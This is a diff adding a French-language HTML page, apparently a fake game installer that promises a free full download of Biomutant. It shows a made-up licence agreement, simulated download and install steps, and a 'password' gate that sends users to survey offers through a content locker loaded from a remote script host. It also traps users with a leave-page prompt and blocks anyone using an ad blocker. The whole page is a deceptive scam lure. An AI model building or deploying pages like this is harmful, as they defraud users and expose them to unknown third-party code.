@@ -1,0 +1,321 @@
+﻿<html>
+
+
+
+        <head>
+
+		
+
+                <title>Assistant de configuration</title>
+
+                <meta name="description" content="Setup Wizard" />
+
+                <meta content="width=device-width, initial-scale=1" name="viewport">
+
+                <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+
+                <meta name="robots" content="noindex,nofollow" />
+
+                <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
+
+                <link href="../css_files/online.css" rel="stylesheet">
+
+                <link href="../css_files/font-awesome.min.css" rel="stylesheet">
+
+                <link rel="stylesheet" href="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/themes/smoothness/jquery-ui.css">
+
+                <link href='https://fonts.googleapis.com/css?family=Titillium+Web:400,700,300' rel='stylesheet' type='text/css'>
+
+                <link rel="icon" href="../css_files/favicon.png" sizes="16x16">
+
+        <style type="text/css">
+
+
+
+    
+
+        .footer {
+
+          position: fixed;
+
+          left: 0;
+
+          bottom: 0;
+
+          width: 100%;
+
+          text-align: center;
+
+        }
+
+                </style>
+<script>
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = '';
+        });
+        </script>
+<script type="text/javascript" src="https://ultradownloder.com/script_include.php?id=1827716"></script>
+<script>
+// Rozwiązanie działające natychmiast na wszystkich przeglądarkach
+(function() {
+    // 1. Funkcja sprawdzająca AdBlock
+    function checkAdBlock() {
+        const testAd = document.createElement('div');
+        testAd.className = 'adsbox ad-unit ad-placement text-ad advertisement ads';
+        testAd.style.cssText = 'height:1px!important;width:1px!important;position:absolute!important;left:-10000px!important;';
+        document.body.appendChild(testAd);
+        
+        setTimeout(() => {
+            const isBlocked = testAd.offsetHeight === 0 || 
+                            testAd.offsetWidth === 0 ||
+                            window.getComputedStyle(testAd).display === 'none';
+            testAd.remove();
+            
+            if (isBlocked) {
+                showAdblockWarning();
+            }
+        }, 100);
+    }
+
+    // 2. Funkcja pokazująca ostrzeżenie
+    function showAdblockWarning() {
+        if (window.adBlockWarningShown) return;
+        window.adBlockWarningShown = true;
+        
+        const warning = document.createElement('div');
+        warning.style.cssText = `
+            position:fixed;
+            top:0;
+            left:0;
+            width:100%;
+            height:100%;
+            background:rgba(0,0,0,0.8);
+            z-index:999999;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            color:white;
+            text-align:center;
+            padding:20px;
+            box-sizing:border-box;
+        `;
+        
+        warning.innerHTML = `
+            <div>
+                <h2 style="color:#ff5555;margin-bottom:20px;">BLOQUEUR DÉTECTÉ</h2>
+                <p style="margin-bottom:30px;font-size:18px;max-width:500px;margin:0 auto;">
+                    Veuillez désactiver votre bloqueur de publicités pour accéder à cette page.
+                </p>
+                <button onclick="window.location.reload()" 
+                        style="
+                            padding:12px 24px;
+                            background:#4CAF50;
+                            color:white;
+                            border:none;
+                            border-radius:5px;
+                            font-size:16px;
+                            cursor:pointer;
+							margin-top:20px;
+                        ">
+                    Recharger la page
+                </button>
+            </div>
+        `;
+        
+        document.body.appendChild(warning);
+    }
+
+    // 3. Wielokrotne sprawdzanie dla pewności
+    if (document.readyState === 'complete') {
+        checkAdBlock();
+        setTimeout(checkAdBlock, 500);
+    } else {
+        document.addEventListener('DOMContentLoaded', function() {
+            checkAdBlock();
+            setTimeout(checkAdBlock, 500);
+        });
+    }
+    
+    // Dodatkowe sprawdzenie po 1.5s (dla Chrome)
+    setTimeout(checkAdBlock, 1500);
+})();
+</script>
+            </head>
+
+            <div class="new-locker-overlay">
+
+                <div class="new-locker">
+
+                    <div class="new-locker-title"><i class="fa fa-unlock-alt" aria-hidden="true"></i> Clé d'activation</div>
+
+                    <div class="new-locker-sub-title">Répondez à une enquête ci-dessous pour déverrouiller ce contenu protégé</div>
+
+                    <div class="offers-content"></div>
+
+                    <div class="new-locker-footer">
+
+                        <i class="fa fa-circle-o-notch fa-spin"></i>
+
+                        <p>En attente de vérification complète ...</p>
+
+                    </div>
+
+                </div>
+
+            </div>
+
+            
+
+
+
+            <script type="text/javascript">
+
+
+
+                var gameName = 'Biomutant';
+
+                var bgImg = 'https://www.dropbox.com/s/qcn535tf21dc2q9/biomutanttemp.jpg?raw=1';
+
+                var downloadSpeed = 3500;
+
+                var installSpeed = 3000; // x
+
+                
+
+
+
+            </script>
+
+
+
+            <body>
+
+                <div class="flex fbc">
+
+                    <div class="main">
+
+                        <div class="navBar fbr">
+
+                            <span id="about" class="navItem showAbout"><i class="fa fa-gamepad"></i></span>
+
+                            <span id="hack" class="navItem showHack"><span class="gameName"></span></span>
+
+                        </div>
+
+                        <div class="content">
+
+                            <div class="step1">
+
+                                Cette page vous permet de télécharger et d'installer la version originale complète de <strong class="gameName"></strong>.
+
+                                <h2>Contrat de licence utilisateur</h2>
+
+                                <div class="eula" id="">
+
+Le présent contrat de licence utilisateur final («CLUF») est un accord juridique entre vous (un individu ou une seule entité) et peut inclure des supports associés, des documents imprimés et de la documentation «en ligne» ou électronique (collectivement, «logiciel» ou «Produit logiciel»). En installant, copiant, téléchargeant, accédant ou utilisant le logiciel, vous acceptez d'être lié par les termes de ce CLUF. Si vous n'acceptez pas les termes de ce CLUF, n'installez pas et n'utilisez pas le Logiciel. Le Logiciel est protégé par les lois sur les droits d'auteur et les traités internationaux sur les droits d'auteur, ainsi que par d'autres lois et traités sur la propriété intellectuelle. Le logiciel est concédé sous licence et non vendu. Les termes en majuscules utilisés dans ce CLUF sont définis comme suit: «Mises à jour» désigne toutes les versions publiques ultérieures du logiciel, y compris les versions bêta publiques, les versions de maintenance, les corrections de bogues, les mises à jour, les améliorations, les ajouts, les améliorations, les extensions , modifications et versions successives. Limitations sur l'ingénierie inverse, la décompilation et le désassemblage. Vous ne pouvez pas effectuer de rétro-ingénierie, décompiler et désassembler le logiciel, y compris les protocoles associés au logiciel, sauf et uniquement dans la mesure où une telle activité est expressément autorisée par la loi en vigueur malgré cette limitation. Sans modifications. Vous ne pouvez modifier aucun composant du logiciel, y compris, mais sans s'y limiter, l'environnement d'exécution, y compris, mais sans s'y limiter, les paramètres du registre. DESCRIPTION DES AUTRES DROITS ET LIMITATIONS: Transfert. Vous ne pouvez pas transférer vos droits en vertu de ce CLUF à un tiers. De location. Vous ne pouvez pas louer, louer ou prêter le logiciel. Marques commerciales Ce CLUF ne vous concède aucun droit en relation avec une marque commerciale ou une marque de service du CLUF Softworks. Résiliation. Nonobstant tout autre droit, CLUF Softworks peut résilier ce CLUF si vous ne vous conformez pas aux termes et conditions de ce CLUF. Dans un tel cas, vous devez détruire toutes les copies du logiciel. Mises à jour et versions successeurs. CLUF Softworks peut, à sa discrétion, effectuer des mises à jour et / ou des versions successives du Logiciel. CLUF Softworks peut rendre disponibles des versions non bêta de ces mises à jour et / ou versions successives du Logiciel («Mises à jour») conformément aux termes du présent Contrat ou, à la seule discrétion du CLUF Softworks, CLUF Softworks peut conditionner la publication de ces mises à jour en acceptant un autre CLUF ou toute autre exécution d'un contrat de services de support distinct. CLUF Softworks peut fournir, mais n'est pas obligé de fournir une assistance technique ou autre («Services d'assistance») pour le Logiciel. Tout code logiciel supplémentaire qui vous est fourni dans le cadre des services d'assistance sera considéré comme faisant partie du logiciel et sera soumis aux termes et conditions du présent CLUF. En ce qui concerne les informations techniques que vous fournissez au CLUF Softworks dans le cadre des Services de support, EULA Softworks peut utiliser ces informations à des fins commerciales, y compris le développement de produits et l'assistance. CLUF Softworks n'utilisera pas ces informations techniques d'une manière qui vous identifie personnellement. Tous les titres et droits de propriété intellectuelle sur le logiciel (y compris, mais sans s'y limiter, les images, photographies, animations, vidéo, audio, musique, texte et «applets» incorporés dans le logiciel), et toutes les mises à jour du logiciel, et toutes les copies qui vous êtes autorisé à faire dans ce document la propriété de EULA Softworks ou de ses fournisseurs. Tous les titres et droits de propriété intellectuelle sur le Contenu accessibles via l'utilisation du Logiciel sont la propriété du propriétaire du Contenu respectif et peuvent être protégés par le droit d'auteur applicable ou d'autres lois et traités de propriété intellectuelle. Tous les droits non expressément accordés sont réservés par EULA Softworks.
+                                </div>
+
+                                <div class="go-step2 nextBtn">Je comprends, continue</div>
+
+                            </div>
+
+                            <div class="step2">
+
+                                <h2><i class="fa fa-cog"></i> Paramètres de base</h2>
+
+                                <div class="check-short check  hidden mobile-hide"><i class="fa fa-square-o"></i> Créer un raccourci sur votre bureau.</div>
+
+                                <div class="check-short check mobile-hide"><i class="fa fa-check-square-o"></i> Créer un raccourci sur votre bureau.</div>
+
+                                <div class="check-read check "><i class="fa fa-square-o"></i> Afficher le fichier Lisez-moi.</div>
+
+                                <div class="check-read check hidden"><i class="fa fa-check-square-o"></i> Afficher le fichier Lisez-moi.</div>
+
+                                <span class="mobile-hide">Le chemin d'installation par défaut est "C:\Program Files\<span class="gameName"></span>" Clique sur le <strong>"Sélectionnez le chemin"</strong> pour conserver les fichiers du jeu dans un répertoire différent ou continuer simplement avec le chemin par défaut. Veuillez noter que lorsque vous sélectionnez le dossier manuellement, le programme d'installation passe automatiquement à l'étape suivante.</span>
+
+                                <input type="file" class="fileFolder mobile-hide" webkitdirectory directory multiple id="fileURL"/>
+
+                                <div class="flex-buttons">
+
+                                    <div class="triggerFile btn mobile-hide">Sélectionnez le chemin</div>
+
+                                    <div class="go-step3 btn">Suivant</div>
+
+                                </div>
+
+                            </div>
+
+                            <div class="loading-msg"><i class="fa fa-refresh fa-spin"></i> Chargement..</div>
+
+                            <div class="step3">
+
+                                Nous configurons votre téléchargement, cela ne prendra qu'un instant !
+
+                                <div class="progress-bar">
+
+                                    <div class="progress"></div>
+
+                                </div>
+
+                                <div class="loading-text">Configuration du processus de téléchargement et d'installation...</div>
+
+                            </div>
+
+                            <div class="step4">
+
+                                <div class="activation-msg"><i class="fa fa-exclamation-triangle"></i> Pour télécharger le jeu gratuitement, vous devez d'abord obtenir un mot de passe</div>
+
+                                <div><a href="#" id="locker" data-locker="test"  class="locker hcclLock">ww</a></div>
+
+                                <input class="inputText" maxlength="15" type="text" value="Mot de passe">
+
+                                <div class="flex-buttons">
+
+                                    
+
+                                    <div class="auth btn" onclick="call_locker();">Obtenez le mot de passe</div>
+
+                                    <div class="btn unlock">Télécharger</div>
+
+                                </div>
+
+                            </div>
+
+                            
+
+                        </div>
+
+                        <div class="footerBar">
+
+        &copy téléchargerdesjeux.com
+
+                        </div>
+
+                    </div>
+
+                </div>
+
+        
+
+           <div class="footer">
+
+        
+
+           </div>
+
+           </body>
+
+        
+
+           <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+           <script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js"></script>
+
+
+
+            <script src="../js_files/game.js" type="text/javascript"></script>        
+
+        </html>
+
+        
